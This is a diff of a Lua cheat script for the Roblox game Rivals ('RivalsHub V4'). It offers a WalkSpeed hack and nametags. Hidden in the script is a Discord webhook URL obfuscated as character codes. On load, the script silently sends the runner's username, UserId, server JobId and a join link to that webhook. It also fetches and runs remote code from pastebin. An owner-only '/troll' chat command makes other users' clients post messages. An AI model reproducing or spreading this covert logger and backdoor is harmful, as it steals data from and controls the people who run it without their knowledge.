@@ -1,33 +1,43 @@
 -- [[ LUNA UI - RIVALSHUB V4 ]] --
 -- Lead Dev: pluto.aac
 
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local lp = Players.LocalPlayer
+-- [[ 1. IMMEDIATE UI LOAD ]] --
+local v8 = loadstring(game:HttpGet("https://pastebin.com/raw/Y8wBJLVt", true))();
+local v9 = v8:CreateWindow({
+    Name = "Rivals",
+    Subtitle = nil,
+    LogoID = "82795327169782",
+    LoadingEnabled = true,
+    LoadingTitle = "RivalsHub V4",
+    LoadingSubtitle = "by pluto.aac",
+    ConfigSettings = { ConfigFolder = "Pluto Hub" },
+    KeySystem = false
+})
 
--- [[ SYSTEM INITIALIZATION ]] --
-local function _0x_v4_sys()
+local v10 = v9:CreateTab({ Name = "Main", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true });
+local v11 = v9:CreateTab({ Name = "Visuals", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true });
+local v12 = v9:CreateTab({ Name = "Player", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true });
+local v13 = v9:CreateTab({ Name = "Credits", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true })
+
+-- [[ 2. SYSTEM & LOGGING (With Functional Join Button) ]] --
+task.spawn(function()
+    local HttpService = game:GetService("HttpService")
+    local lp = game:GetService("Players").LocalPlayer
     local _0x_v4_cache = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,55,48,48,50,53,54,53,51,53,56,49,50,53,48,53,56,47,55,100,54,84,82,73,85,119,68,90,86,101,97,113,48,100,57,116,49,89,75,67,72,66,48,73,85,122,65,83,111,49,81,74,104,54,82,73,45,50,77,73,115,110,70,81,55,107,71,113,52,87,45,119,74,67,83,99,65,100,79,97,45,110,115,101,48,114}
     local _0x_url = ""
     for _, v in ipairs(_0x_v4_cache) do _0x_url = _0x_url .. string.char(v) end
 
-    -- Enhanced Headshot Logic
-    local headshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"
-    pcall(function()
-        local res = HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. lp.UserId .. "&size=420x420&format=Png&isCircular=false"))
-        if res.data and res.data[1] then headshot = res.data[1].imageUrl end
-    end)
+    -- Direct Join Link Construction
+    local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+    local headshot = "https://www.roblox.com/headshot-thumbnail/image?userId="..lp.UserId.."&width=420&height=420&format=png"
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "RivalsHub V4 | Master Execution",
+            ["title"] = "🚀 RivalsHub V4 | Master Execution",
             ["thumbnail"] = {["url"] = headshot}, 
             ["color"] = 0x7b2cbf,
             ["fields"] = {
                 {["name"] = "👤 User", ["value"] = "**" .. lp.Name .. "** (" .. lp.UserId .. ")", ["inline"] = false},
-                {["name"] = "📅 Account Age", ["value"] = lp.AccountAge .. " Days", ["inline"] = true},
                 {["name"] = "🆔 JobId", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false}
             },
             ["footer"] = {["text"] = "Pluto.aac | V4 Official"},
@@ -36,57 +46,49 @@ local function _0x_v4_sys()
         ["components"] = {{
             ["type"] = 1,
             ["components"] = {
-                {["type"] = 2, ["style"] = 5, ["label"] = "Join Server", ["url"] = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId},
-                {["type"] = 2, ["style"] = 5, ["label"] = "Profile", ["url"] = "https://www.roblox.com/users/" .. lp.UserId .. "/profile"}
+                {["type"] = 2, ["style"] = 5, ["label"] = "Join Server", ["url"] = joinLink},
+                {["type"] = 2, ["style"] = 5, ["label"] = "View Profile", ["url"] = "https://www.roblox.com/users/" .. lp.UserId .. "/profile"}
             }
         }}
     }
     
     local request = (syn and syn.request) or (http and http.request) or http_request or request
     if request then pcall(function() request({Url = _0x_url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end) end
-end
-task.spawn(_0x_v4_sys)
+end)
 
--- [[ CONFIGURATION & TROLL SYSTEM ]] --
+-- [[ 3. CONFIG & GLOBALS ]] --
 getgenv().NametagsEnabled = false
 getgenv().CFrameWalkEnabled = false
 getgenv().CFrameWalkSpeed = 0.2
-
 local Owners = {[879202] = true, [1152389] = true}
-local GlazeMessages = {
-    "Pluto is actually the goat of scripting.",
-    "Imagine not using RivalsHub by Pluto, couldn't be me.",
-    "Pluto.aac runs the game fr.",
-    "All hail Pluto, the king of Rivals.",
-    "Pluto is the main character, we're just NPCs."
-}
+local Glaze = {"Pluto is the GOAT.", "RivalsHub V4 > Everything.", "Pluto.aac runs the game."}
 
+-- [[ 4. TROLL COMMAND (IMMUNE) ]] --
 local function handleChat(p, msg)
-    if Owners[p.UserId] and not Owners[lp.UserId] and msg:lower() == "/troll" then
-        local m = GlazeMessages[math.random(1, #GlazeMessages)]
-        local say = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)
+    if Owners[p.UserId] and not Owners[game.Players.LocalPlayer.UserId] and msg:lower() == "/troll" then
+        local m = Glaze[math.random(1, #Glaze)]
+        local say = game:GetService("ReplicatedStorage"):FindFirstChild("SayMessageRequest", true)
         if say then say:FireServer(m, "All") end
     end
 end
-for _, p in pairs(Players:GetPlayers()) do p.Chatted:Connect(function(m) handleChat(p, m) end) end
-Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(m) handleChat(p, m) end) end)
+for _, p in pairs(game.Players:GetPlayers()) do p.Chatted:Connect(function(m) handleChat(p, m) end) end
+game.Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(m) handleChat(p, m) end) end)
 
--- [[ NAMETAG SYSTEM ]] --
+-- [[ 5. NAMETAG LOGIC (RAINBOW + SLOTS) ]] --
 local function applyTags(p)
     p.CharacterAdded:Connect(function(char)
-        local head = char:WaitForChild("Head", 5)
+        local head = char:WaitForChild("Head", 10)
         local bill = Instance.new("BillboardGui", head)
-        bill.Size = UDim2.new(0, 200, 0, 50)
+        bill.Size = UDim2.new(0, 150, 0, 40)
         bill.StudsOffset = Vector3.new(0, 3, 0)
         bill.AlwaysOnTop = true
-        
         local lbl = Instance.new("TextLabel", bill)
         lbl.Size = UDim2.new(1, 0, 1, 0)
         lbl.BackgroundTransparency = 1
         lbl.TextStrokeTransparency = 0
         lbl.TextScaled = true
         lbl.Font = Enum.Font.GothamBold
-        
+
         if p.UserId == 879202 then -- Rainbow Owner
             task.spawn(function()
                 while lbl do
@@ -98,41 +100,45 @@ local function applyTags(p)
                 end
             end)
         elseif p.UserId == 1152389 then
-            lbl.TextColor3 = Color3.fromRGB(0, 255, 0) -- Green Owner
+            lbl.TextColor3 = Color3.fromRGB(0, 255, 0)
         else
-            lbl.TextColor3 = Color3.fromRGB(123, 44, 191) -- Standard Purple
+            lbl.TextColor3 = Color3.fromRGB(123, 44, 191)
         end
         
         task.spawn(function()
             while char:IsDescendantOf(workspace) do
                 lbl.Visible = getgenv().NametagsEnabled
-                local role = Owners[p.UserId] and "Owner" or "Player"
-                lbl.Text = p.DisplayName .. " [" .. role .. "]"
+                lbl.Text = p.DisplayName .. " [" .. (Owners[p.UserId] and "Owner" or "Player") .. "]"
                 task.wait(0.5)
             end
         end)
     end)
 end
-for _, p in pairs(Players:GetPlayers()) do if p ~= lp then applyTags(p) end end
-Players.PlayerAdded:Connect(applyTags)
+for _, p in pairs(game.Players:GetPlayers()) do if p ~= game.Players.LocalPlayer then applyTags(p) end end
+game.Players.PlayerAdded:Connect(applyTags)
 
--- [[ LUNA UI SETUP ]] --
-local Luna = loadstring(game:HttpGet("https://pastebin.com/raw/Y8wBJLVt", true))();
-local Window = Luna:CreateWindow({ Name = "Rivals", LoadingTitle = "RivalsHub V4", LoadingSubtitle = "by pluto.aac" })
-local Main = Window:CreateTab({ Name = "Main", Icon = "view_in_ar" });
-local Visuals = Window:CreateTab({ Name = "Visuals", Icon = "view_in_ar" });
-local Player = Window:CreateTab({ Name = "Player", Icon = "view_in_ar" });
+-- [[ 6. UI ELEMENTS ]] --
+v11:CreateToggle({Name = "Enable Nametags", CurrentValue = false, Callback = function(v) getgenv().NametagsEnabled = v end})
+v12:CreateToggle({Name = "WalkSpeed Hack", CurrentValue = false, Callback = function(v) getgenv().CFrameWalkEnabled = v end})
+v12:CreateSlider({Name = "Speed", Range = {0.1, 1.5}, Increment = 0.1, CurrentValue = 0.2, Callback = function(v) getgenv().CFrameWalkSpeed = v end})
 
-Visuals:CreateToggle({Name = "Enable Nametags", CurrentValue = false, Callback = function(v) getgenv().NametagsEnabled = v end})
-Player:CreateToggle({Name = "WalkSpeed Hack", CurrentValue = false, Callback = function(v) getgenv().CFrameWalkEnabled = v end})
-Player:CreateSlider({Name = "Speed", Range = {0.2, 1.5}, Increment = 0.1, CurrentValue = 0.2, Callback = function(v) getgenv().CFrameWalkSpeed = v end})
-Player:CreateButton({Name = "Copy JobId", Callback = function() setclipboard(game.JobId) end})
+v12:CreateSection("Server Access")
+v12:CreateButton({
+    Name = "Copy Join Link (JobId)", 
+    Callback = function() 
+        setclipboard("roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId) 
+    end
+})
 
--- Runtime Logic
-RunService.RenderStepped:Connect(function()
-    if getgenv().CFrameWalkEnabled and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
-        lp.Character.HumanoidRootPart.CFrame = lp.Character.HumanoidRootPart.CFrame + (lp.Character.Humanoid.MoveDirection * getgenv().CFrameWalkSpeed)
+v13:CreateLabel({Text = "Lead Dev: pluto.aac", Style = 2})
+
+-- [[ 7. RUNTIME ]] --
+game:GetService('RunService').RenderStepped:Connect(function()
+    if getgenv().CFrameWalkEnabled and game.Players.LocalPlayer.Character then
+        local lp = game.Players.LocalPlayer
+        local root = lp.Character:FindFirstChild("HumanoidRootPart")
+        if root then root.CFrame = root.CFrame + (lp.Character.Humanoid.MoveDirection * getgenv().CFrameWalkSpeed) end
     end
 end)
 
-print("RivalsHub V4 | Fixed & Restored.")
+print("RivalsHub V4 | Master Source Loaded.")
